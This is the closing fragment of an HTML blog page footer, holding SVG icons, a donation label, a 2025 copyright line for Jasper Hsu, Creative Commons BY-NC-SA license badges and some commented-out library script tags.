                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2025 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
<!--
<script type="text/javascript" src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/bootstrap@5.2.1/dist/js/bootstrap.min.js"></script>
<div id="back-to-top" class=""><svg viewBox="0 0 24 24"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path></svg></div>
-->
</div>
</body>
</html>
